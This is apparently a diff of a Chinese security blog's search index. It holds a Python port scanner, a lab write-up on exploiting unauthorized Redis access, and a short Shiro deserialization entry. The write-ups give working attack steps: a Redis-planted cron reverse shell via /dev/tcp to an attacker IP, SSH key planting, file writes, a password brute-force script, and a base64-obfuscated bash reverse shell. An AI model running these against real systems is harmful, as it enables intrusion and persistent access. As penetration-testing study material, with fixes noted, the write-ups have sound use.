connect.ex()会一直尝试连接，连接成功返回0，失败返回错误信息（key值）</span><br><span class="line">        if c.connect_ex((host, port)) == 0:</span><br><span class="line">            print(&quot;%s:%d is open&quot; % (host, port))</span><br><span class="line">            s = host + &quot;:&quot; + str(port)</span><br><span class="line">            # 开启进程锁，多线程写入数据</span><br><span class="line">            lock.acquire()</span><br><span class="line">            with open(&#x27;./ports.txt&#x27;, &#x27;a&#x27;) as fp:</span><br><span class="line">                fp.write(s + &quot;\n&quot;)</span><br><span class="line">                # 释放锁</span><br><span class="line">            lock.release()</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;%s:%d not open&quot; % (host, port))</span><br><span class="line">        # 关闭套接字连接</span><br><span class="line">        c.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 独立执行时的程序入口</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    #argv用来接收用户输入，按输入次序分别为argv[0-n],argv[0]表示脚本名</span><br><span class="line">    if len(sys.argv) &lt; 3:</span><br><span class="line">        print(&quot;请以以下格式输入：&quot;)</span><br><span class="line">        print(&quot;python portScan.py ip 线程数&quot;)</span><br><span class="line">    host = sys.argv[1]</span><br><span class="line">    thread_num = int(sys.argv[2])</span><br><span class="line">    # 在进程开始前，定义进程锁，不可在进程中定义锁，否则线程自己使用自己的锁，则失去进程锁的意义</span><br><span class="line">    lock = threading.Lock()</span><br><span class="line"></span><br><span class="line">    for port in range(1, 65536):</span><br><span class="line">        q.put(port)</span><br><span class="line">    for i in range(thread_num):</span><br><span class="line">        # 开启守护进程</span><br><span class="line">        t = threading.Thread(target=portScan, args=[q], daemon=True)</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    # 设置主进程死循环，方便接收中断信号</span><br><span class="line">    # 因为设置了守护进程，所以主进程结束，子进程也会立刻结束</span><br><span class="line">    while True:</span><br><span class="line">        pass</span><br></pre>
-
-<h1 id="四、下载"><a href="#四、下载" class="headerlink" title="四、下载"></a>四、下载</h1><p><a href="https://www.zerochen.top/download/Port/PortScan.py">https://www.zerochen.top/download/Port/PortScan.py</a></p>
-]]></content>
-      <categories>
-        <category>Python</category>
-      </categories>
-      <tags>
-        <tag>端口扫描</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Python之网络爬虫</title>
     <url>/article/Python%E4%B9%8B%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/</url>
     <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>借用网络爬虫脚本，记录下requests模块和bs4模块的知识点，以供日后查阅。</p>
@@ -4947,6 +4947,141 @@
       </categories>
       <tags>
         <tag>爬虫</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Redis未授权访问漏洞复现</title>
+    <url>/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h1><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。</p>
+<h1 id="二、漏洞特征"><a href="#二、漏洞特征" class="headerlink" title="二、漏洞特征"></a>二、漏洞特征</h1><p>开放6379端口，可尝试免密登录</p>
+<p>漏洞版本：Redis 2.x，3.x，4.x，5.x</p>
+<pre class="highlight"><span class="line">redis-cli -h x.x.x.x</span><br><span class="line">或</span><br><span class="line">redis-cli -h x.x.x.x -p 6379</span><br></pre>
+
+<h1 id="三、漏洞复现"><a href="#三、漏洞复现" class="headerlink" title="三、漏洞复现"></a>三、漏洞复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>攻击机：Kali2020.1</p>
+<p>靶机：Ubuntu20 + Redis2.8.17</p>
+<p>1、下载环境</p>
+<pre class="highlight"><span class="line">wget http://download.redis.io/releases/redis-2.8.17.tar.gz</span><br></pre>
+
+<p>2、解压并进入安装目录</p>
+<pre class="highlight"><span class="line">tar xzf redis-2.8.17.tar.gz</span><br><span class="line">make</span><br></pre>
+
+<p>报错：</p>
+<pre class="highlight"><span class="line">gcc: Command not found</span><br></pre>
+
+<p>解决：安装gcc</p>
+<pre class="highlight"><span class="line">apt install gcc</span><br></pre>
+
+<p>清理编译文件，重新编译</p>
+<pre class="highlight"><span class="line">make distclean  &amp;&amp; make</span><br></pre>
+
+<p>3、</p>
+<p>拷贝关键文件</p>
+<pre class="highlight"><span class="line">cp redis.conf /etc/</span><br><span class="line">cd src</span><br><span class="line">cp redis-benchmark redis-cli redis-server /usr/bin/</span><br></pre>
+
+<p>4、启动</p>
+<pre class="highlight"><span class="line">./redis-server		#src目录</span><br></pre>
+
+<p><img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162755821.png" alt="image-20210809162755821" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162755821.png" class="lozad post-image"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="无密码登录"><a href="#无密码登录" class="headerlink" title="无密码登录"></a>无密码登录</h3><pre class="highlight"><span class="line">redis-cli -h 192.168.24.79		#登录</span><br></pre>
+
+<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162803617.png" alt="image-20210809162803617" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162803617.png" class="lozad post-image"></p>
+<p>登陆成功</p>
+<h3 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h3><p>前提：登陆成功、知道路径（phpinfo或错误暴路径等）、读写权限等</p>
+<p>因为没有搭建网站环境，这里写在用户根目录</p>
+<pre class="highlight"><span class="line">config set dir /home/chen/</span><br><span class="line">config set dbfilename redis.php	</span><br><span class="line">set webshell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">或</span><br><span class="line">set x &quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;</span><br><span class="line">save</span><br></pre>
+
+<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162814551.png" alt="image-20210809162814551" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162814551.png" class="lozad post-image"></p>
+<p>靶机成功写入</p>
+<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162823433.png" alt="image-20210809162823433" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162823433.png" class="lozad post-image"></p>
+<h3 id="定时反弹shell"><a href="#定时反弹shell" class="headerlink" title="定时反弹shell"></a>定时反弹shell</h3><p>需要管理员权限</p>
+<pre class="highlight"><span class="line">nc -lvnp 4444		# 攻击机开启监听</span><br><span class="line"></span><br><span class="line"># 连接redis，写定时反弹shell</span><br><span class="line">redis-cli -h 192.168.24.79</span><br><span class="line">config set dir /var/spool/cron/crontabs</span><br><span class="line">config set dbfilename root</span><br><span class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.24.82/4444 0&gt;&amp;1\n\n&quot;		#每分钟执行一次反弹连接</span><br><span class="line">save</span><br></pre>
+
+<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162930370.png" alt="image-20210809162930370" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162930370.png" class="lozad post-image"></p>
+<p>注意！</p>
+<p>1、Ubuntu系统需要以管理员权限更改/bin下的软链接指向</p>
+<pre class="highlight"><span class="line">ln -s -f bash /bin/sh		# 定时任务bash为dash,无交互功能</span><br></pre>
+
+<p>2、Ubuntu下定时任务乱码则不执行，需手动删除乱码</p>
+<p>3、redis远程连接创建定时任务权限为644，但是定时任务权限需要为600才可执行</p>
+<pre class="highlight"><span class="line">chmod 600 root</span><br></pre>
+
+<p>解决以上坑点，成功反弹shell</p>
+<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162939325.png" alt="image-20210809162939325" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162939325.png" class="lozad post-image"></p>
+<p>但是这样意义不大，据说centos无以上坑点。</p>
+<h3 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h3><p>1、攻击机生成ssh密钥（空密码）</p>
+<pre class="highlight"><span class="line">ssh-keygen -t rsa		# 全部回车</span><br><span class="line">cd .ssh/</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt		# 写入公钥</span><br></pre>
+
+<p>2、设置redis变量</p>
+<pre class="highlight"><span class="line">cat ./key.txt | redis-cli -h 192.168.24.79 -x set tide		# 将公钥内容设置给redis变量（靶机ip）</span><br></pre>
+
+<p>3、连接redis并写入</p>
+<pre class="highlight"><span class="line">redis-cli -h 192.168.24.79</span><br><span class="line">config set dir /root/.ssh					# 默认公私钥路径</span><br><span class="line">config set dbfilename authorized_keys		# 写入authorized_keys</span><br><span class="line">save</span><br></pre>
+
+<p>4、检查靶机文件是否写入–已写入（同样带有乱码）</p>
+<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162954548.png" alt="image-20210809162954548" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162954548.png" class="lozad post-image"></p>
+<p>5、攻击机进行ssh连接</p>
+<pre class="highlight"><span class="line">ssh -o StrictHostKeyChecking=no 192.168.24.79		# 首次连接需要加-o StrictHostKeyChecking=no</span><br></pre>
+
+<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163005569.png" alt="image-20210809163005569" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163005569.png" class="lozad post-image"></p>
+<p>连接成功</p>
+<p>（注：靶机需要安装ssh服务并关闭防火墙，或者允许22端口通过防火墙）</p>
+<p>附Ubuntu安装ssh</p>
+<pre class="highlight"><span class="line">sudo apt-get install openssh-server		# 安装ssh</span><br><span class="line">sudo /etc/init.d/ssh start 				# 开启ssh</span><br><span class="line">ufw allow 22/tcp						# 允许通过防火墙</span><br><span class="line">或</span><br><span class="line">sudo ufw disable						# 不建议</span><br></pre>
+
+<h3 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h3><p>redis:4.x - redis:5.0.5版本漏洞，redis开启主从复制，主从数据相同，主redis只写，从redis只读，从而减小服务器压力。在Redis 4.x之后，Redis新增了模块功能，通过外部拓展，可以在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载so恶意文件，就可以拓展新命令。</p>
+<p>到这里懒癌犯了，不想搭环境了，附上脚本下载链接，直接过，遇到回头再来。</p>
+<pre class="highlight"><span class="line">https://github.com/n0b0dyCN/redis-rogue-server</span><br></pre>
+
+<p>这里还有个内网redis利用姿势–gopher协议，一并懒过去。</p>
+<h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>感觉这个比较实用，弱口令yyds！</p>
+<p>准备：</p>
+<p>打开redis.conf配置文件，找到requirepass，去掉注释，修改后面的参数，即为密码</p>
+<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163040446.png" alt="image-20210809163040446" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163040446.png" class="lozad post-image"></p>
+<p>密码登录</p>
+<pre class="highlight"><span class="line">redis-cli -h 192.168.24.79 -a password</span><br></pre>
+
+<p>以上，开始编写Python脚本</p>
+<pre class="highlight"><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    描述：redis未授权访问探测 + 密码爆破</span><br><span class="line">    author: chen</span><br><span class="line">    date: 2021-07-03</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import threading</span><br><span class="line">import queue</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def poc():</span><br><span class="line">    global flag</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((ip, port))</span><br><span class="line">    # 发送INFO，如果无密码则返回服务器信息，包含版本信息；如果有密码，则返回“-NOAUTH Authentication required”</span><br><span class="line">    s.send(&#x27;INFO\r\n&#x27;.encode(&#x27;utf-8&#x27;))</span><br><span class="line">    result = s.recv(1024).decode(&#x27;utf-8&#x27;)</span><br><span class="line">    if &quot;redis_version&quot; in result:</span><br><span class="line">        print(&quot;存在redis未授权访问漏洞！&quot;)</span><br><span class="line">        flag = True</span><br><span class="line">    elif &quot;Authentication&quot; in result:</span><br><span class="line">        flag = False</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;未知错误&quot;)</span><br><span class="line">        flag = None</span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def burst():</span><br><span class="line">    while not q.empty():</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((ip, port))</span><br><span class="line">        _pass = q.get()</span><br><span class="line">        msg = &quot;AUTH &quot; + _pass + &quot;\r\n&quot;          # AUTH pass 为redis密码格式</span><br><span class="line">        s.send(msg.encode(&#x27;utf-8&#x27;))</span><br><span class="line">        result = s.recv(1024).decode(&#x27;utf-8&#x27;)</span><br><span class="line">        if &#x27;+OK&#x27; in result:</span><br><span class="line">            print(&quot;存在弱口令，密码为%s&quot; % _pass)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    if len(sys.argv) != 5:</span><br><span class="line">        print(&quot;请按照格式输出：\n&quot;)</span><br><span class="line">        print(&quot;redis.py 10.10.10.10 6379 字典名 线程数 \n&quot;)</span><br><span class="line"></span><br><span class="line">    flag = True</span><br><span class="line">    q = queue.Queue()</span><br><span class="line"></span><br><span class="line">    ip = sys.argv[1]</span><br><span class="line">    port = int(sys.argv[2])</span><br><span class="line">    dic = sys.argv[3]</span><br><span class="line">    thread = sys.argv[4]</span><br><span class="line"></span><br><span class="line">    poc()</span><br><span class="line"></span><br><span class="line">    if flag:</span><br><span class="line">        exit()</span><br><span class="line">    else:</span><br><span class="line">        path = os.path.dirname(os.path.realpath(__file__))      # 获取当前脚本目录</span><br><span class="line">        for i in open(path + &#x27;/&#x27; + dic):</span><br><span class="line">            q.put(i.strip())                                    # 清洗字符，去掉头尾的换行和空格</span><br><span class="line">        for i in range(int(thread)):</span><br><span class="line">            t = threading.Thread(target=burst(), daemon=True)</span><br><span class="line">            t.start()</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        pass</span><br></pre>
+
+<p>结果：</p>
+<p>空密码：</p>
+<p><img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163058335.png" alt="image-20210809163058335" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163058335.png" class="lozad post-image"></p>
+<p>设置密码</p>
+<p><img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163105143.png" alt="image-20210809163105143" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163105143.png" class="lozad post-image"></p>
+<p>————————————————————————————————————————————————————————————</p>
+<p>修改脚本，链接：</p>
+<p><a href="https://www.zerochen.top/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/">Pocsuite3重写redis脚本 (zerochen.top)</a></p>
+<h1 id="四、修复"><a href="#四、修复" class="headerlink" title="四、修复"></a>四、修复</h1><h2 id="指定ip登录"><a href="#指定ip登录" class="headerlink" title="指定ip登录"></a>指定ip登录</h2><p>在redis.conf文件找到# bind 127.0.0.1，去掉注释，修改为指定的登录ip</p>
+<p>缺点：多点登陆失效。</p>
+<h2 id="增加密码"><a href="#增加密码" class="headerlink" title="增加密码"></a>增加密码</h2><p>打开redis.conf配置文件，找到requirepass，去掉注释，修改后面的参数，即为密码</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Redis</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Shiro反序列化漏洞复现</title>
+    <url>/article/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="1、探测"><a href="#1、探测" class="headerlink" title="1、探测"></a>1、探测</h1><p>在登录界面回包中，有rememberMe=deleteMe参数，说明使用Shiro反序列化。</p>
+<h1 id="2、利用"><a href="#2、利用" class="headerlink" title="2、利用"></a>2、利用</h1><p>a、使用shiroExploit工具检测，反弹shell</p>
+<pre class="highlight"><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre>
+
+<p>b、使用xray检测，直接发送payload</p>
+<pre class="highlight"><span class="line">xray webscan --url &quot;http://&quot; --html-output 1.html</span><br></pre>
+
+<p>或指定脚本检测</p>
+<pre class="highlight"><span class="line">xray webscan --url &quot;http://&quot; --plugins shiro --html-output 1.html</span><br></pre>
+
+<p>将发包贴入burpsuite发包，将Testecho: namzzg修改为Testcmd:ls即可执行对应指令，也可反弹shell，语句同上</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Shiro</tag>
       </tags>
   </entry>
   <entry>
@@ -5119,141 +5254,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Redis未授权访问漏洞复现</title>
-    <url>/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h1><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。</p>
-<h1 id="二、漏洞特征"><a href="#二、漏洞特征" class="headerlink" title="二、漏洞特征"></a>二、漏洞特征</h1><p>开放6379端口，可尝试免密登录</p>
-<p>漏洞版本：Redis 2.x，3.x，4.x，5.x</p>
-<pre class="highlight"><span class="line">redis-cli -h x.x.x.x</span><br><span class="line">或</span><br><span class="line">redis-cli -h x.x.x.x -p 6379</span><br></pre>
-
-<h1 id="三、漏洞复现"><a href="#三、漏洞复现" class="headerlink" title="三、漏洞复现"></a>三、漏洞复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>攻击机：Kali2020.1</p>
-<p>靶机：Ubuntu20 + Redis2.8.17</p>
-<p>1、下载环境</p>
-<pre class="highlight"><span class="line">wget http://download.redis.io/releases/redis-2.8.17.tar.gz</span><br></pre>
-
-<p>2、解压并进入安装目录</p>
-<pre class="highlight"><span class="line">tar xzf redis-2.8.17.tar.gz</span><br><span class="line">make</span><br></pre>
-
-<p>报错：</p>
-<pre class="highlight"><span class="line">gcc: Command not found</span><br></pre>
-
-<p>解决：安装gcc</p>
-<pre class="highlight"><span class="line">apt install gcc</span><br></pre>
-
-<p>清理编译文件，重新编译</p>
-<pre class="highlight"><span class="line">make distclean  &amp;&amp; make</span><br></pre>
-
-<p>3、</p>
-<p>拷贝关键文件</p>
-<pre class="highlight"><span class="line">cp redis.conf /etc/</span><br><span class="line">cd src</span><br><span class="line">cp redis-benchmark redis-cli redis-server /usr/bin/</span><br></pre>
-
-<p>4、启动</p>
-<pre class="highlight"><span class="line">./redis-server		#src目录</span><br></pre>
-
-<p><img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162755821.png" alt="image-20210809162755821" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162755821.png" class="lozad post-image"></p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="无密码登录"><a href="#无密码登录" class="headerlink" title="无密码登录"></a>无密码登录</h3><pre class="highlight"><span class="line">redis-cli -h 192.168.24.79		#登录</span><br></pre>
-
-<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162803617.png" alt="image-20210809162803617" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162803617.png" class="lozad post-image"></p>
-<p>登陆成功</p>
-<h3 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h3><p>前提：登陆成功、知道路径（phpinfo或错误暴路径等）、读写权限等</p>
-<p>因为没有搭建网站环境，这里写在用户根目录</p>
-<pre class="highlight"><span class="line">config set dir /home/chen/</span><br><span class="line">config set dbfilename redis.php	</span><br><span class="line">set webshell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">或</span><br><span class="line">set x &quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;</span><br><span class="line">save</span><br></pre>
-
-<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162814551.png" alt="image-20210809162814551" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162814551.png" class="lozad post-image"></p>
-<p>靶机成功写入</p>
-<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162823433.png" alt="image-20210809162823433" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162823433.png" class="lozad post-image"></p>
-<h3 id="定时反弹shell"><a href="#定时反弹shell" class="headerlink" title="定时反弹shell"></a>定时反弹shell</h3><p>需要管理员权限</p>
-<pre class="highlight"><span class="line">nc -lvnp 4444		# 攻击机开启监听</span><br><span class="line"></span><br><span class="line"># 连接redis，写定时反弹shell</span><br><span class="line">redis-cli -h 192.168.24.79</span><br><span class="line">config set dir /var/spool/cron/crontabs</span><br><span class="line">config set dbfilename root</span><br><span class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.24.82/4444 0&gt;&amp;1\n\n&quot;		#每分钟执行一次反弹连接</span><br><span class="line">save</span><br></pre>
-
-<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162930370.png" alt="image-20210809162930370" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162930370.png" class="lozad post-image"></p>
-<p>注意！</p>
-<p>1、Ubuntu系统需要以管理员权限更改/bin下的软链接指向</p>
-<pre class="highlight"><span class="line">ln -s -f bash /bin/sh		# 定时任务bash为dash,无交互功能</span><br></pre>
-
-<p>2、Ubuntu下定时任务乱码则不执行，需手动删除乱码</p>
-<p>3、redis远程连接创建定时任务权限为644，但是定时任务权限需要为600才可执行</p>
-<pre class="highlight"><span class="line">chmod 600 root</span><br></pre>
-
-<p>解决以上坑点，成功反弹shell</p>
